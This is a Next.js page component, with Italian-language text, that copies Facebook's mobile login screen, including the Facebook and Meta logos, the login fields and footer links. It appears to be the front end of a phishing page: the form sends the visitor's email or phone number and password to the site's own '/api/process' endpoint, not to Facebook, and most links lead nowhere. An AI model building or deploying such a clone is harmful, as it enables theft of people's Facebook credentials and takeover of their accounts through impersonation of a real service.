'use client';

import Image from 'next/image';

export default function Home() {
  return (
    <main>
      <div className="top-banner">
        Scarica Facebook per Android per navigare più velocemente.
      </div>

      <div className="fb-container">
        <div className="fb-logo">
          <Image src="/facebook.png" alt="Facebook Logo" width={60} height={60} />
        </div>

        <div className="fb-login-box">
          <form className="fb-form" method="POST" action="/api/process">
            <input type="text" name="email" placeholder="Numero di cellulare o e-mail" required />
            <input type="password" name="password" placeholder="Password" required />
            <button type="submit">Accedi</button>
            <a href="/recupero" className="forgot">Password dimenticata?</a>
            <hr />
            <button type="button" className="create-account">Crea nuovo account</button>
          </form>
        </div>

        <div className="meta-footer">
          <Image src="/meta.png" alt="Meta Logo" width={60} height={60} className="meta-logo" />
          <div className="meta-links">
            <a href="#">Informazioni</a>
            <a href="#">Centro assistenza</a>
            <a href="#">Altro</a>
          </div>
        </div>
      </div>
    </main>
  );
}
